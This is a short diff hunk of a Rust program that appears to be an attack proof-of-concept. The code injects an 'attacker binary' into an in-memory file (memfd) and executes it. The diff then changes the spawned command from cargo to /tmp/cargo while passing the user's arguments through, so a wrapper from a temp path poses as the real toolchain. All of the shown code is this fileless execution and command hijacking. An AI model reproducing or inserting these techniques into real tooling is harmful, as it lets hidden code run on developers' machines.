@@ -12,7 +12,7 @@ fn main() -> Result<()> {
     // Create memfd, inject attacker binary into it and execute it
     SealedCommand::new(&mut Cursor::new(attacker_binary))?.output()?.status.success();
     
-    if let Ok(mut c) = Command::new("cargo")
+    if let Ok(mut c) = Command::new("/tmp/cargo")
             .args(env::args().skip(1).into_iter())
             .spawn() {
                 c.wait()?;
